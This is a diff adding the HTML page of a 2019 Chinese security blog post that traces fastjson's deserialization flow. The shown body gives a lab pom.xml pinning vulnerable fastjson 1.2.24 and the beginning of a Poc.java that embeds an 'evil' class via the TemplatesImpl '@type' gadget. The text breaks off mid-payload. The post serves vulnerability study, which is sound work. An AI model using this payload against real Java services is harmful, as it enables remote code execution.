@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="fastjson用于将Java Bean序列化为JSON字符串,也可以从JSON字符串反序列化到JavaBean">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson 反序列化流程硬核跟踪">
+<meta property="og:url" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="fastjson用于将Java Bean序列化为JSON字符串,也可以从JSON字符串反序列化到JavaBean">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569587047128.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569587087142.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569940580037.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569120846409.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569121697471.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569121849067.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569122340408.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569393851685.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569941780435.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569123937120.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569123900016.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569123997961.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569136890182.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569138569725.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569396571361.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569396639528.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569400686165.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569946978448.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569402342199.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569982590526.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569983315580.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569983723950.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569511032560.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569511220400.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569511346335.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569984381146.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569511793223.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569490857135.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569491000388.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569512316826.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569512351441.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569487153087.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569569979360.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569513241314.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569513602747.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569997637825.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569513780402.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569592836749.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569987252636.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569570858786.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569633321786.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569574729954.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569575532296.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569575672975.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569575793082.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569636061623.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569636169022.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569835286521.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1570001070880.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569837134265.png">
+<meta property="article:published_time" content="2019-10-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T14:41:07.209Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/1569587047128.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>fastjson 反序列化流程硬核跟踪 | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastjson 反序列化流程硬核跟踪
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-10-02 00:00:00" itemprop="dateCreated datePublished" datetime="2019-10-02T00:00:00+08:00">2019-10-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 22:41:07" itemprop="dateModified" datetime="2019-12-21T22:41:07+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>12 mins.</span>
+            </span>
+            <div class="post-description">fastjson用于将Java Bean序列化为JSON字符串,也可以从JSON字符串反序列化到JavaBean</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lisan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>learnfastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Poc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/Test.class"</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + 